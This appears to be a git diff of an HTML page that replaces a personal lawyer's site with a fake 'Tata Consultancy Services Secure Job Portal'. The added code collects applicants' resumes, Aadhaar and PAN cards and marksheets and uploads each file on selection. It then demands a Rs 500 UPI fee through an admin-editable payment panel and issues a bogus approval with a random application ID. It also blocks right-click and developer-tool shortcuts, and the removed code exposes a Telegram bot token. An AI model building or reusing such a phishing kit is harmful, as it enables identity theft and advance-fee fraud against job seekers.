@@ -1,283 +1,295 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Sourav Dey | Legal Document Writer</title>
-  <style>
-    body {
-      font-family: "Poppins", Arial, sans-serif;
-      background: linear-gradient(to right, #eef2f3, #d9e4ec);
-      color: #222;
-      margin: 0;
-      padding: 0;
-    }
-
-    header {
-      background: #0a3d62;
-      color: white;
-      text-align: center;
-      padding: 30px 15px;
-      border-bottom: 5px solid #60a3bc;
-    }
-
-    header h1 {
-      font-size: 2.4em;
-      margin-bottom: 10px;
-      letter-spacing: 1px;
-    }
-
-    header p {
-      font-size: 1.1em;
-      color: #dcdde1;
-    }
-
-    section {
-      max-width: 900px;
-      background: white;
-      margin: 30px auto;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0px 4px 15px rgba(0,0,0,0.1);
-    }
-
-    h2 {
-      color: #0a3d62;
-      border-left: 4px solid #60a3bc;
-      padding-left: 10px;
-      margin-bottom: 15px;
-    }
-
-    #profile-desc p {
-      font-size: 1.1em;
-      line-height: 1.6em;
-    }
-
-    #telegram-images {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 15px;
-      justify-content: center;
-    }
-
-    #telegram-images img {
-      width: 220px;
-      height: 220px;
-      object-fit: cover;
-      border-radius: 10px;
-      box-shadow: 0 3px 10px rgba(0,0,0,0.3);
-      cursor: pointer;
-      transition: transform 0.3s ease;
-    }
-
-    #telegram-images img:hover {
-      transform: scale(1.05);
-    }
-
-    .upload-box {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-
-    input[type="file"] {
-      padding: 8px;
-      border: 1px solid #aaa;
-      border-radius: 6px;
-    }
-
-    button {
-      padding: 10px 16px;
-      border: none;
-      border-radius: 6px;
-      background: #0a3d62;
-      color: white;
-      font-weight: 600;
-      cursor: pointer;
-      margin-left: 8px;
-    }
-
-    button:hover {
-      background: #60a3bc;
-    }
-
-    footer {
-      text-align: center;
-      color: #444;
-      padding: 15px;
-      font-size: 0.9em;
-    }
-
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TCS Secure Job Portal</title>
+<style>
+  body {
+    font-family: 'Poppins', sans-serif;
+    background: #f2f6fc;
+    color: #23375b;
+    margin: 0; padding: 0 15px 40px;
+  }
+  header {
+    text-align:center;
+    background: linear-gradient(90deg, #09203f, #537895);
+    padding: 25px 20px;
+    box-shadow: 0 4px 10px rgba(12,35,75,0.3);
+    color: #fff;
+  }
+  header h1 { margin:0; font-size:1.8em; letter-spacing:1px; }
+  section {
+    max-width: 720px; margin: 40px auto;
+    background: white; border-radius: 10px;
+    padding: 30px 35px;
+    box-shadow: 0 8px 25px rgba(12,35,75,0.12);
+  }
+  h2 {
+    color: #114b8b;
+    border-left: 5px solid #014f86;
+    padding-left: 12px;
+    margin-bottom: 25px;
+  }
+  label { display:block; margin-bottom:10px; font-weight:600; }
+  input[type="text"], input[type="file"], input[type="password"], input[type="number"], select {
+    width:100%; padding:10px; border-radius:6px;
+    border:1.5px solid #c1d4e6; font-size:1em;
+  }
+  button {
+    background-color:#0c234b; color:white; border:none;
+    padding:14px 0; width:100%; border-radius:8px;
+    font-weight:700; font-size:1.05em;
+    margin-top:20px; cursor:pointer; transition:0.3s;
+  }
+  button:hover { background-color:#014f86; transform: scale(1.02); }
+  #screenshotPreview img {
+    width:180px; border-radius:8px; margin-top:10px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.2);
+  }
+  footer { text-align:center; margin-top:50px; font-size:0.9em; color:#555; }
+  .admin-settings { background:#eef4fc; padding:10px; border-radius:8px; margin-top:10px; }
+</style>
 </head>
 <body>
-  <header>
-    <h1>Adv. Sourav Dey</h1>
-    <p>Legal Document & Criminal Matter Format Writer</p>
-  </header>
 
-  <section id="profile-desc">
-    <h2>About Me</h2>
-    <p>
-      I am <strong>Sourav Dey</strong>, a dedicated legal professional specialized in drafting and preparing
-      <em>Criminal Matter Formats</em> — including bail petitions, FIR-related formats, affidavits, and court submissions.
-      My focus is to provide accurate, clear, and professional legal documentation services.  
-      Apart from my legal work, I maintain this website to share important updates and personal insights.
-    </p>
-  </section>
+<header>
+  <h1>Tata Consultancy Services - Secure Job Portal</h1>
+</header>
 
-  <section>
-    <h2>My Telegram Storage Images</h2>
-    <!-- Only show upload-box if user is authorized -->
-    <div id="uploadContainer" class="upload-box" style="display:none;">
-      <input type="file" id="imageInput" accept="image/*" />
-      <button onclick="uploadToTelegram()">Upload Image</button>
-    </div>
-    <div id="telegram-images">
-      <p>🔄 Loading images from Telegram...</p>
-    </div>
-  </section>
+<!-- ====================== APPLY SECTION ======================= -->
+<section id="apply-section">
+  <h2>Apply for Job</h2>
+  <label>Upload Resume (PDF)
+    <input type="file" id="resume" accept=".pdf">
+  </label>
+  <label>Upload Aadhaar Card
+    <input type="file" id="aadhaar" accept="image/*,.pdf">
+  </label>
+  <label>Upload PAN Card
+    <input type="file" id="pancard" accept="image/*,.pdf">
+  </label>
+  <label>Upload Higher Secondary Marksheet
+    <input type="file" id="hsMarksheet" accept="image/*,.pdf">
+  </label>
+  <label>Upload School/College Marksheet
+    <input type="file" id="collegeMarksheet" accept="image/*,.pdf">
+  </label>
+  <label>Select Job Location:
+    <select id="job-location">
+      <option value="">--Select--</option>
+      <option>Hyderabad</option><option>Bangalore</option>
+      <option>Chennai</option><option>Pune</option>
+      <option>Noida</option><option>Gujarat</option>
+    </select>
+  </label>
+  <button id="applyBtn">Apply Now</button>
+</section>
 
-  <footer>
-    <p>© 2025 Sourav Dey | All rights reserved | Legal Format Writer</p>
-  </footer>
+<!-- ====================== PAYMENT SECTION ======================= -->
+<section id="payment-section" style="display:none;">
+  <h2>Complete Payment</h2>
+  <p>Amount to pay: ₹ <strong id="paymentAmount">500</strong></p>
+  <p>UPI ID: <strong id="upiId">tcssecure@upi</strong></p>
+  <div id="qrCode"></div>
+  <button id="paymentDoneBtn">Payment Completed</button>
+</section>
 
-  <script>
-    const telegramBotToken = "5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE";
-    const channelId = -1003102946985;
-    const apiBase = `https://api.telegram.org/bot${telegramBotToken}`;
-    let lastUpdateId = 0;
+<!-- ====================== SCREENSHOT UPLOAD ======================= -->
+<section id="screenshot-section" style="display:none;">
+  <h2>Upload Payment Screenshot</h2>
+  <label>Select Screenshot:
+    <input type="file" id="screenshot" accept="image/*">
+  </label>
+  <div id="screenshotPreview"></div>
+  <button id="submitScreenshotBtn">Submit Screenshot</button>
+</section>
 
-    // Example logged-in username, replace with your actual logic
-    const currentUsername = "M226318"; // আপনার ইউজারনেম (যে ইউজার ছবি আপলোড করবে)
-    const allowedUploader = "M226318"; // যাকে আপলোড করার অনুমতি
+<!-- ====================== PENDING ======================= -->
+<section id="pending-section" style="display:none;">
+  <h2>Awaiting Approval</h2>
+  <p>✅ Screenshot submitted successfully.</p>
+  <p>⏳ Please wait for HR/Admin to approve your application.</p>
+</section>
 
-    // দেখাবে কেবল যদি সঠিক ইউজার হয়
-    function checkUploader() {
-      if (currentUsername === allowedUploader) {
-        document.getElementById("uploadContainer").style.display = "block";
-      } else {
-        document.getElementById("uploadContainer").style.display = "none";
-      }
+<!-- ====================== SUCCESS ======================= -->
+<section id="success-section" style="display:none;">
+  <h2>🎉 Application Approved</h2>
+  <p><strong>Application ID:</strong> <span id="applicationId"></span></p>
+  <p><strong>Selected Location:</strong> <span id="selectedLocation"></span></p>
+  <p><strong>Interview Date:</strong> Next Month 27</p>
+  <p><strong>Time:</strong> 10 AM</p>
+</section>
+
+<!-- ====================== ADMIN PANEL ======================= -->
+<section id="admin-section" style="margin-top:40px;">
+  <h2>HR/Admin Panel</h2>
+  <label>Enter Admin Password:
+    <input type="password" id="adminPass">
+  </label>
+  <div id="adminSettings" class="admin-settings" style="display:none;">
+    <h3>🔧 Update Payment Settings</h3>
+    <label>Change UPI ID:
+      <input type="text" id="newUpiId" placeholder="Enter new UPI ID">
+    </label>
+    <label>Change Amount (₹):
+      <input type="number" id="newAmount" placeholder="Enter new amount">
+    </label>
+    <button id="updatePaymentBtn">Update Payment Info</button>
+  </div>
+  <button id="approveBtn">Approve Application</button>
+</section>
+
+<footer>
+  <p>© 2025 Tata Consultancy Services | All rights reserved</p>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+// =================== SECURE VARIABLES ====================
+const secureHash = btoa("Sourav@1234"); // Encrypted Password
+let upiId = "tcssecure@upi";
+let paymentAmount = 500;
+let jobLocation = "";
+let screenshotUploaded = false;
+
+const backendUrl = 'http://localhost:3001/upload'; // আপনার Node.js সার্ভার URL এখানে বসাবেন
+
+// =================== FILE UPLOAD TO TELEGRAM STORAGE WITH COMPRESSION ====================
+async function uploadFile(file, label) {
+  try {
+    const formData = new FormData();
+    formData.append('file', file);
+
+    const res = await fetch(backendUrl, { method: 'POST', body: formData });
+
+    if (!res.ok) throw new Error('Failed to upload ' + label);
+    const data = await res.json();
+    console.log(`${label} uploaded successfully:`, data);
+  } catch(error) {
+    console.error(error);
+    alert(`Error uploading ${label}: ${error.message}`);
+  }
+}
+
+// Attach onchange handlers to file inputs for automatic upload
+['resume','aadhaar','pancard','hsMarksheet','collegeMarksheet'].forEach(id => {
+  document.getElementById(id).addEventListener('change', e => {
+    const file = e.target.files[0];
+    if (file) {
+      uploadFile(file, id);
     }
+  });
+});
 
-    async function fetchTelegramImages() {
-      const container = document.getElementById("telegram-images");
-      if(!container) return;
-      container.innerHTML = `<p>🔄 Loading images from Telegram...</p>`;
-      try {
-        const response = await fetch(`${apiBase}/getUpdates?offset=${lastUpdateId + 1}`);
-        const data = await response.json();
-        if (!data.ok) {
-          container.innerHTML = "<p>⚠️ Failed to load images.</p>";
-          return;
-        }
-        const updates = data.result;
-        const newPhotos = [];
+// Payment screenshot onchange handler (upload + preview)
+document.getElementById('screenshot').addEventListener('change', e => {
+  const file = e.target.files[0];
+  if (file) {
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      document.getElementById('screenshotPreview').innerHTML = `<img src="${ev.target.result}" alt="Screenshot Preview">`;
+      screenshotUploaded = true;
+    };
+    reader.readAsDataURL(file);
 
-        for (const update of updates) {
-          if (update.update_id > lastUpdateId) lastUpdateId = update.update_id;
-          if (
-            update.message &&
-            update.message.chat &&
-            update.message.chat.id === channelId &&
-            update.message.photo
-          ) {
-            const photoArr = update.message.photo;
-            const largest = photoArr[photoArr.length - 1];
-            newPhotos.push(largest.file_id);
-          }
-        }
+    uploadFile(file, "payment screenshot");
+  }
+});
 
-        if (newPhotos.length === 0) {
-          container.innerHTML = "<p>📭 No new images found in Telegram Storage channel.</p>";
-          return;
-        }
+// =================== APPLY ====================
+document.getElementById("applyBtn").onclick = () => {
+  const resume = document.getElementById("resume").files[0];
+  const aadhaar = document.getElementById("aadhaar").files[0];
+  const pan = document.getElementById("pancard").files[0];
+  const hs = document.getElementById("hsMarksheet").files[0];
+  const college = document.getElementById("collegeMarksheet").files[0];
+  jobLocation = document.getElementById("job-location").value;
 
-        for (const fileId of newPhotos) {
-          const fileRes = await fetch(`${apiBase}/getFile?file_id=${fileId}`);
-          const fileData = await fileRes.json();
-          if (fileData.ok && fileData.result && fileData.result.file_path) {
-            const imgUrl = `https://api.telegram.org/file/bot${telegramBotToken}/${fileData.result.file_path}`;
-            const img = document.createElement("img");
-            img.src = imgUrl;
-            img.alt = "Telegram Storage Image";
-            container.appendChild(img);
-          }
-        }
-      } catch (error) {
-        console.error("Error:", error);
-        container.innerHTML = "<p>❌ Error loading images.</p>";
-      }
-    }
+  if(!resume || !aadhaar || !pan || !hs || !college || !jobLocation){
+    alert("⚠️ Please upload all required documents and select location.");
+    return;
+  }
 
-    // Image compression function
-    function compressImage(file, quality = 0.6, maxWidth = 1024) {
-      return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.readAsDataURL(file);
-        reader.onload = event => {
-          const img = new Image();
-          img.src = event.target.result;
-          img.onload = () => {
-            const canvas = document.createElement("canvas");
-            let width = img.width;
-            let height = img.height;
+  document.getElementById("apply-section").style.display="none";
+  document.getElementById("payment-section").style.display="block";
+  document.getElementById("paymentAmount").textContent = paymentAmount;
+  document.getElementById("upiId").textContent = upiId;
+  
+  document.getElementById("qrCode").innerHTML = "";
+  new QRCode(document.getElementById("qrCode"), {
+    text:`upi://pay?pa=${upiId}&am=${paymentAmount}&cu=INR`,
+    width:150, height:150
+  });
+};
 
-            if(width > maxWidth){
-              height = height * (maxWidth / width);
-              width = maxWidth;
-            }
-            canvas.width = width;
-            canvas.height = height;
+// =================== PAYMENT DONE ====================
+document.getElementById("paymentDoneBtn").onclick = ()=>{
+  document.getElementById("payment-section").style.display="none";
+  document.getElementById("screenshot-section").style.display="block";
+};
 
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(img, 0, 0, width, height);
-            canvas.toBlob(
-              blob => resolve(blob),
-              "image/jpeg",
-              quality
-            );
-          };
-          img.onerror = error => reject(error);
-        };
-        reader.onerror = error => reject(error);
-      });
-    }
+// =================== SUBMIT SCREENSHOT ====================
+document.getElementById("submitScreenshotBtn").onclick = ()=>{
+  if(!screenshotUploaded){
+    alert("⚠️ Please upload screenshot first!");
+    return;
+  }
+  document.getElementById("screenshot-section").style.display="none";
+  document.getElementById("pending-section").style.display="block";
+};
 
-    async function uploadToTelegram() {
-      const fileInput = document.getElementById("imageInput");
-      const file = fileInput.files[0];
-      if (!file) {
-        alert("Please select an image to upload!");
-        return;
-      }
-      try {
-        const compressedBlob = await compressImage(file, 0.6, 1024);
-        const formData = new FormData();
-        formData.append("chat_id", channelId);
-        formData.append("photo", compressedBlob, file.name);
+// =================== ADMIN LOGIN ====================
+document.getElementById("adminPass").addEventListener("input", ()=>{
+  const pass = document.getElementById("adminPass").value.trim();
+  const encoded = btoa(pass);
+  if(encoded === secureHash){
+    document.getElementById("adminSettings").style.display="block";
+  } else {
+    document.getElementById("adminSettings").style.display="none";
+  }
+});
 
-        const response = await fetch(`${apiBase}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
+// =================== UPDATE PAYMENT INFO ====================
+document.getElementById("updatePaymentBtn").onclick = ()=>{
+  const newUpi = document.getElementById("newUpiId").value.trim();
+  const newAmt = parseFloat(document.getElementById("newAmount").value.trim());
 
-        const result = await response.json();
-        if (result.ok) {
-          alert("✅ Image uploaded successfully!");
-          setTimeout(fetchTelegramImages, 2500);
-        } else {
-          alert("⚠️ Upload failed. Please check bot permissions or token.");
-        }
-      } catch (error) {
-        alert("❌ Error uploading image. See console for details.");
-        console.error(error);
-      }
-    }
+  if(newUpi){
+    upiId = newUpi;
+    document.getElementById("upiId").textContent = upiId;
+  }
+  if(newAmt && newAmt > 0){
+    paymentAmount = newAmt;
+    document.getElementById("paymentAmount").textContent = paymentAmount;
+  }
 
-    // Initialize
-    checkUploader();
-    fetchTelegramImages();
-  </script>
+  alert("✅ Payment information updated successfully!");
+};
+
+// =================== APPROVE APPLICATION ====================
+document.getElementById("approveBtn").onclick = ()=>{
+  const pass = document.getElementById("adminPass").value.trim();
+  const encoded = btoa(pass);
+  if(encoded === secureHash){
+    document.getElementById("pending-section").style.display="none";
+    document.getElementById("success-section").style.display="block";
+    document.getElementById("applicationId").textContent = 
+      "TCS" + Math.floor(100000 + Math.random() * 900000);
+    document.getElementById("selectedLocation").textContent = jobLocation;
+    alert("✅ Application Approved Successfully!");
+  } else {
+    alert("❌ Wrong Admin Password!");
+  }
+};
+
+// =================== BASIC ANTI-HACK ====================
+document.addEventListener("contextmenu", e => e.preventDefault());
+document.onkeydown = function(e) {
+  if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode==73)) return false;
+  if(e.ctrlKey && e.keyCode==85) return false;
+};
+</script>
+
 </body>
 </html>
